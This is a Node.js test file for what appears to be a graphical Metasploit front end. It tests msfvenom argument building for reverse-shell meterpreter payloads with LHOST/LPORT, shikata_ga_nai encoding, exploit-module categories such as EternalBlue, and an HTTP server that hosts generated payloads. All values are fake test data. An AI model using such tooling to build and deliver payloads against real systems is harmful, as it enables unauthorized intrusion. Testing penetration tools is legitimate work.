import { test } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import { buildMsfvenomArgs } from '../src/main/msfvenom.js'
import { pickLocalIPv4s } from '../src/main/netinfo.js'
import { FileServerManager } from '../src/main/fileServer.js'
import { normalize } from '../src/main/msfrpc.js'
import {
  defaultFormatFor,
  extForFormat,
  asList,
  PAYLOAD_FORMATS,
  MODULE_CATEGORIES
} from '../src/shared/payloads.js'

// ---------- msfvenom arg building ----------
test('buildMsfvenomArgs: apk omits -f (android payload generates its own apk)', () => {
  const args = buildMsfvenomArgs({
    payload: 'android/meterpreter/reverse_tcp',
    options: { LHOST: '10.0.0.5', LPORT: '4444' },
    format: 'apk',
    outFile: '/tmp/m.apk'
  })
  assert.ok(!args.includes('-f'), 'apk must not pass -f')
  assert.ok(args.includes('android/meterpreter/reverse_tcp'))
  assert.ok(args.includes('LHOST=10.0.0.5'))
  assert.ok(args.includes('LPORT=4444'))
  assert.deepEqual(args.slice(-2), ['-o', '/tmp/m.apk'])
})

test('buildMsfvenomArgs: exe includes -f exe and passes options', () => {
  const args = buildMsfvenomArgs({
    payload: 'windows/x64/meterpreter/reverse_tcp',
    options: { LHOST: '1.2.3.4', LPORT: '4444' },
    format: 'exe',
    outFile: '/tmp/m.exe'
  })
  const i = args.indexOf('-f')
  assert.notEqual(i, -1)
  assert.equal(args[i + 1], 'exe')
})

test('buildMsfvenomArgs: encoder, iterations and badchars are included', () => {
  const args = buildMsfvenomArgs({
    payload: 'windows/meterpreter/reverse_tcp',
    options: {},
    format: 'exe',
    encoder: 'x86/shikata_ga_nai',
    iterations: 3,
    badchars: '\\x00',
    outFile: '/tmp/x.exe'
  })
  assert.equal(args[args.indexOf('-e') + 1], 'x86/shikata_ga_nai')
  assert.equal(args[args.indexOf('-i') + 1], '3')
  assert.equal(args[args.indexOf('-b') + 1], '\\x00')
})

test('buildMsfvenomArgs: empty option values are skipped', () => {
  const args = buildMsfvenomArgs({
    payload: 'p',
    options: { LHOST: '1.2.3.4', LPORT: '' },
    format: 'raw',
    outFile: '/tmp/o'
  })
  assert.ok(args.includes('LHOST=1.2.3.4'))
  assert.ok(!args.some((a) => a.startsWith('LPORT=')))
})

// ---------- local IP detection ----------
test('pickLocalIPv4s: returns non-internal IPv4s, LAN ranges first', () => {
  const fake = {
    lo0: [{ address: '127.0.0.1', family: 'IPv4', internal: true }],
    en0: [
      { address: '192.168.1.42', family: 'IPv4', internal: false },
      { address: 'fe80::1', family: 'IPv6', internal: false }
    ],
    en1: [{ address: '8.8.8.8', family: 4, internal: false }]
  }
  const ips = pickLocalIPv4s(fake)
  assert.deepEqual(ips.map((x) => x.address), ['192.168.1.42', '8.8.8.8'])
})

test('pickLocalIPv4s: empty input is safe', () => {
  assert.deepEqual(pickLocalIPv4s(undefined), [])
  assert.deepEqual(pickLocalIPv4s({}), [])
})

// ---------- shared payload helpers ----------
test('defaultFormatFor picks a compatible format per platform', () => {
  assert.equal(defaultFormatFor('android/meterpreter/reverse_tcp'), 'apk')
  assert.equal(defaultFormatFor('windows/x64/meterpreter/reverse_tcp'), 'exe')
  assert.equal(defaultFormatFor('linux/x64/shell_reverse_tcp'), 'elf')
  assert.equal(defaultFormatFor('osx/x64/shell_reverse_tcp'), 'macho')
  assert.equal(defaultFormatFor('java/meterpreter/reverse_tcp'), 'jar')
  assert.equal(defaultFormatFor('python/meterpreter/reverse_tcp'), 'python')
  assert.equal(defaultFormatFor('generic/shell_bind_tcp'), 'raw')
  assert.equal(defaultFormatFor(''), 'raw')
})

test('extForFormat resolves extensions incl. special apk', () => {
  assert.equal(extForFormat('apk'), '.apk')
  assert.equal(extForFormat('exe'), '.exe')
  assert.equal(extForFormat('raw'), '.bin')
  assert.equal(extForFormat('nope'), '')
})

test('asList unwraps { modules: [...] } and tolerates shapes', () => {
  assert.deepEqual(asList({ modules: ['a', 'b'] }), ['a', 'b'])
  assert.deepEqual(asList(['x']), ['x'])
  assert.deepEqual(asList(null), [])
  assert.deepEqual(asList({}), [])
})

test('PAYLOAD_FORMATS contains no invalid apk entry', () => {
  const ids = Object.values(PAYLOAD_FORMATS).flat().map((f) => f.id)
  assert.ok(!ids.includes('apk'), 'apk must not be a generic -f format')
  assert.ok(ids.includes('exe') && ids.includes('elf') && ids.includes('macho'))
})

test('MODULE_CATEGORIES match on module fullnames', () => {
  const win = MODULE_CATEGORIES.find((c) => c.id === 'windows')
  assert.ok(win.match('exploit/windows/smb/ms17_010_eternalblue'))
  assert.ok(!win.match('exploit/linux/http/foo'))
  const all = MODULE_CATEGORIES.find((c) => c.id === 'all')
  assert.ok(all.match('anything/at/all'))
})

// ---------- msgpack response normalization ----------
test('normalize: Buffers become strings, nested maps/arrays handled', () => {
  const input = new Map([
    [Buffer.from('result'), Buffer.from('success')],
    ['nested', [Buffer.from('a'), 1, true]]
  ])
  const out = normalize(input)
  assert.equal(out.result, 'success')
  assert.deepEqual(out.nested, ['a', 1, true])
})

// ---------- file host server (integration) ----------
test('FileServerManager serves the exact file bytes over HTTP, then stops', async () => {
  const tmp = path.join(os.tmpdir(), `mdtest_${Date.now()}.bin`)
  const payload = Buffer.from('MZ\x90\x00 fake-payload-bytes')
  fs.writeFileSync(tmp, payload)

  const srv = new FileServerManager()
  const info = await srv.start(tmp, 0, '127.0.0.1') // port 0 => ephemeral
  const port = srv.server.address().port

  const body = await new Promise((resolve, reject) => {
    http.get({ host: '127.0.0.1', port, path: '/' + info.fileName }, (res) => {
      const chunks = []
      res.on('data', (c) => chunks.push(c))
      res.on('end', () => resolve(Buffer.concat(chunks)))
    }).on('error', reject)
  })

  assert.ok(body.equals(payload), 'served bytes match the file')
  assert.equal(srv.stop(), true)
  assert.equal(srv.running, false)
  fs.unlinkSync(tmp)
})

test('FileServerManager rejects a missing file', async () => {
  const srv = new FileServerManager()
  await assert.rejects(() => srv.start('/no/such/file', 0, '127.0.0.1'))
})
